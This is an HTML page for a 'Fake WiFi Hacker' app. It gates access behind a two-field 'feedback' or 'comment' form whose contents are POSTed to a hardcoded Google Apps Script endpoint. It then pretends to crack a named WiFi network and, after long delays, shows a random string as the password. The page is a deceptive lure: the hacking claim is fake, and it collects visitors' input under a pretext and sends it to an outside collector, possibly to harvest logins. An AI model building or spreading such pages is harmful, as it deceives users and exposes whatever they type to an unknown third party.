<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Fake WiFi Hacker</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{box-sizing:border-box}
body{
  margin:0;
  background:#000;
  color:#0f0;
  font-family:monospace;
}

.screen{
  position:fixed;
  inset:0;
  display:none;
  justify-content:center;
  align-items:center;
  flex-direction:column;
}

.show{display:flex}

input,select,button{
  width:260px;
  margin:6px;
  padding:10px;
  background:#000;
  color:#0f0;
  border:1px solid #0f0;
}

button{cursor:pointer}

.err{border-color:red;color:red}

.progress{
  width:260px;
  border:1px solid #0f0;
}
.bar{
  height:18px;
  width:0%;
  background:#0f0;
}

.sidebar{
  position:fixed;
  left:0;
  top:0;
  width:180px;
  height:100%;
  background:#040;
  padding:10px;
}

.sidebar div{
  margin:12px 0;
  cursor:pointer;
}

.content{
  margin-left:180px;
  width:100%;
  height:100%;
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
}

.anim{animation:blink 1s infinite}
@keyframes blink{50%{opacity:.3}}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading" class="screen show">
  <h3>Initializing System</h3>
  <div class="progress"><div id="bar" class="bar"></div></div>
  <p id="lp">Loading 0%</p>
</div>

<!-- GATE -->
<div id="gate" class="screen">
  <h3>ACCESS REQUIRED</h3>

  <button onclick="openForm('fb')">FEEDBACK</button>
  <button onclick="openForm('cm')">COMMENT</button>

  <div id="fb" style="display:none">
    <input id="fb1" placeholder="Feedback 1">
    <input id="fb2" placeholder="Feedback 2">
    <button onclick="submitData('FEEDBACK')">SUBMIT</button>
  </div>

  <div id="cm" style="display:none">
    <input id="cm1" placeholder="Comment 1">
    <input id="cm2" placeholder="Comment 2">
    <button onclick="submitData('COMMENT')">SUBMIT</button>
  </div>
</div>

<!-- APP -->
<div id="app" class="screen">

  <div class="sidebar">
    <div onclick="showPage('main')">MAIN</div>
    <div onclick="showPage('hack')">HACK WIFI</div>
    <div onclick="showPage('settings')">SETTINGS</div>
  </div>

  <div class="content" id="main">
    <h2 class="anim">SYSTEM READY</h2>
  </div>

  <div class="content" id="hack" style="display:none">
    <input id="wifi" placeholder="ENTER WIFI NAME">
    <select id="usage">
      <option value="">Network usage</option>
      <option>Detect Automatically</option>
      <option>Treat as Metered</option>
      <option>Treat as Unmetered</option>
    </select>
    <select id="auto">
      <option value="">Auto Connect</option>
      <option>ON</option>
      <option>OFF</option>
    </select>
    <button onclick="bypass()">BYPASS</button>
    <p id="log"></p>
  </div>

  <div class="content" id="settings" style="display:none">
    <label>FPS</label>
    <input type="range" min="30" max="144">
    <label>Graphics</label>
    <select>
      <option>LOW</option>
      <option>MEDIUM</option>
      <option>HIGH</option>
      <option>ULTRA</option>
    </select>
  </div>

</div>

<script>
const WEBAPP = "https://script.google.com/macros/s/AKfycbwk6BLxBPmDuJ2wrVitvrXUnMkNfI4nXM7Ipu3CI6d8uOMqqK18VFlGNOzqKCdMylih/exec";

/* LOADING */
let p=0;
const bar=document.getElementById("bar");
const lp=document.getElementById("lp");

const load=setInterval(()=>{
  p++;
  bar.style.width=p+"%";
  lp.innerText="Loading "+p+"%";
  if(p>=100){
    clearInterval(load);
    showScreen("gate");
  }
},25);

/* SCREEN CONTROL */
function showScreen(id){
  document.querySelectorAll(".screen").forEach(s=>s.classList.remove("show"));
  document.getElementById(id).classList.add("show");
}

/* GATE */
function openForm(x){
  document.getElementById("fb").style.display="none";
  document.getElementById("cm").style.display="none";
  document.getElementById(x).style.display="block";
}

function submitData(type){
  const a=type==="FEEDBACK"?fb1.value:cm1.value;
  const b=type==="FEEDBACK"?fb2.value:cm2.value;
  if(!a||!b){navigator.vibrate(300);return;}

  fetch(WEBAPP,{
    method:"POST",
    body:JSON.stringify({type,field1:a,field2:b})
  }).then(()=>{
    showScreen("app");
  });
}

/* APP NAV */
function showPage(id){
  ["main","hack","settings"].forEach(p=>{
    document.getElementById(p).style.display="none";
  });
  document.getElementById(id).style.display="flex";
}

/* FAKE BYPASS */
function bypass(){
  const wifi=document.getElementById("wifi");
  const usage=document.getElementById("usage");
  const auto=document.getElementById("auto");
  let ok=true;
  [wifi,usage,auto].forEach(i=>{
    if(!i.value){i.classList.add("err");ok=false}
    else i.classList.remove("err");
  });
  if(!ok){navigator.vibrate(400);return;}

  log.innerHTML="<span class='anim'>SEARCHING...</span>";
  setTimeout(()=>{
    log.innerHTML="WIFI DETECTED<br>PRIVATE / PUBLIC";
    setTimeout(()=>{
      log.innerHTML="SUCCESS<br>PASSWORD = "+
        Math.random().toString(36).slice(-10).toUpperCase();
    },15000);
  },25000);
}
</script>
</body>
</html>
